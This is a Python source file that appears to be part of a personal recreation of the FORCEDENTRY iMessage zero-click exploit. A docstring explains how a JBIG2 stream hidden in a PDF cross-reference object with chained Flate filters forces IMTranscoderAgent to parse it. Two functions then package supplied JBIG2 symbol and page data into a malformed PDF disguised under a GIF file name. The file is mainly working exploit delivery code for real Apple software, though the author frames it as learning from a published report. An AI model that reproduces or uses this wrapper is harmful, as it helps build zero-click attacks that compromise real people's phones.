import zlib

"""
Everything below is written with a shaky understanding of the PDF specification, take it with a grain of salt. 
These are my own observations and vocabulary, I found this by tracing execution flow with Frida and manually 
generating PDFs in a text editor.

The CitizenLab report on FORCEDENTRY helped fill in the gaps here. From their report:
...
	PDF Comment '%PDF-1.3\n\n'

	obj 1 0
	Type: /XRef
	Referencing:
	Contains stream

	<< /Type /XRef /Size 9 /W [1 3 1] /Length ... /Filter [/FlateDecode /FlateDecode /JBIG2Decode] /DecodeParms >>
...

This snippet led me to explore the difference between XRef and XObject, and after a bit of manual experimentation
I figured out what was going on.

Ref: https://citizenlab.ca/2021/09/forcedentry-nso-group-imessage-zero-click-exploit-captured-in-the-wild/


Trick to force IMTranscoderAgent to parse the JBIG2 stream. Two things going on here:
	1. The JBIG2Stream is forced into a /XRef object. Normally, an XRef would function like a table of contents
	   for the PDF. The original pdf.py script which triggered a crash in UserNotificationsUIThumbnailProvider
	   placed the JBIG2Stream in an XObj, which was parsed when rendering the thumbnail. Since the XRef must be
	   parsed first to pull information about the PDF in IMTranscoderAgent, and an XRef is just a stream, we can
	   apply a JBIG2Decode filter to the XRef. This creates an invalid PDF, but the mechanism of applying filters
	   to streams and the ToC being a stream are both valid operations. THIS is the trick to crash IMTranscoderAgent,
	   which has a less restrictive sandbox than UserNotificationsUIThumbnailProvider.
	   
	   Ref: https://stackoverflow.com/questions/35506224/internal-structure-of-pdf-file-decode-params
	
	2. The JBIG2Stream is being compressed. In practice, there seems to be a maximum size of the table of contents
	   so it's necessary to chain two FlateDecode filters to reduce the total size of the stream.
"""
def wrap_payload_compressed(gif, sym, page):
	with open(gif, 'wb') as f:
		header =  b"%PDF-1.7" + b"\r\n"
		header += b"%\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd" + b"\r\n"
		
		payload = b""
		with open(sym, 'rb') as sym:
			payload += sym.read()
		with open(page, 'rb') as page:
			payload += page.read()
		# Perform Flate encoding on the input data
		compressed_payload = zlib.compress(zlib.compress(payload))
		payload = compressed_payload
		payload_obj = b"1 0 obj\n" \
		b"<< /DecodeParms\n" \
		b"    << /JBIG2Globals 1337 0 R >>\n" \
		b"    /Width 1\n" \
		b"    /Height 1\n" \
		b"    /Filter [ /FlateDecode /FlateDecode /JBIG2Decode ]\n" + bytes(f"    /Length {len(payload)}\n", 'utf-8') + b"" \
		b"    /Size 1\n" \
		b"    /Type /XRef /W[1 3 1]\n" \
		b">>stream\n"

		tail = b"endstream\n" \
		b"endobj\n\n" \
		b"startxref\n" \
		b"25\n" \
		b"%%EOF\r\n"

		f.write(header)
		f.write(payload_obj)
		f.write(payload)
		f.write(tail)	

# Same as wrap_payload_compressed but without the encoding, useful for crash testing/using very small payloads
def wrap_payload(gif, sym, page):
	with open(gif, 'wb') as f:
		header =  b"%PDF-1.7" + b"\r\n"
		header += b"%\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd" + b"\r\n"
		
		payload = b""
		with open(sym, 'rb') as sym:
			payload += sym.read()
		with open(page, 'rb') as page:
			payload += page.read()
		payload_obj = b"1 0 obj\n" \
		b"<< /DecodeParms\n" \
		b"    << /JBIG2Globals 1337 0 R >>\n" \
		b"    /Width 1\n" \
		b"    /Height 1\n" \
		b"    /Filter [ /JBIG2Decode ]\n" + bytes(f"    /Length {len(payload)}\n", 'utf-8') + b"" \
		b"    /Size 1\n" \
		b"    /Type /XRef /W[1 3 1]\n" \
		b">>stream\n"

		tail = b"endstream\n" \
		b"endobj\n\n" \
		b"startxref\n" \
		b"25\n" \
		b"%%EOF\r\n"

		f.write(header)
		f.write(payload_obj)
		f.write(payload)
		f.write(tail)	
